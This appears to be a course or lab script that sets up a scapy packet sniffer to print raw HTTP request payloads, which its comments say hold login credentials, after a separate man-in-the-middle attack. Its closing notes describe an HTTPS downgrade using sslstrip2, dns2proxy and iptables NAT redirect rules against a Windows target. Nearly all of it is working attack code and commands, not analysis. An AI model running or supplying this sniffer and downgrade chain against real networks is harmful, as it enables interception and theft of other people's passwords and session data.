''' PACKET LISTENER 
: pip install scapy_http (allows working on http requests in a better way)
[ Run the previous MITM code(to get in the middle of windows and router), open wireshark, browse(mostly http/login unicorn)on windows and analyze the wireshark(search for http-post mostly)]
**^ignore [] if you're working with layers**
'''

import scapy.all as scapy
from scapy_http import http

def listen_packets(interface):
	scapy.sniff(iface=interface,store=False,prn=analyze_packets)	#prn is actually a callback function, hence calls a function		

def analyze_packets(packet):
	if packet.haslayer(http.HTTPRequest):						#haslayer is an inbuilt method, in http.HTTPRequest, http is the imported module.
		if packet.haslayer(scapy.raw):
			print(packet[scapy.Raw].load)					#since the creds are present in raw layer, under 'load'.

listen_packets("eth0")
#Now first run the mitm project and then in a new window, run the above project. Can again login unicorn(in windows ovio)to test.

'''Downgrading HTTPS
Git clone https://github.com/byt3bl33d3r/sslstrip2, if not installed in kali. 
Git clone https://github.com/singe/dns2proxy
We need to do some ip table forwarding before running the above.
: iptables -t nat -A PREROUTING -p tcp --destination-port 80 REDIRECT --to-port 10000	
#t-table(using nat table), prerouting rule, p-protocol used, since data coming from port 80 hence dest set so, since sslstrips run on port 10000 hence set so.
#In short, tcp packets coming from port 80 will be redirected to port 10000(where sslstrips are working on)
: iptables -t nat -A PREROUTING -p udp --destination-port 54 REDIRECT --to-port 53 	#this is for dnsproxy, not necessary though
Now we'll need 4 kali terminal windows.(ssl,dnsproxy,mitm,packetListener)
On 1st run mitm, and on 2nd run the packet listener.
Now on 3rd :sslstrip , on 4th :python dnsproxy.py (newly cloned)
On windows first try an http(unicorn) and then try an https(bitifinex)(not hsts).
'''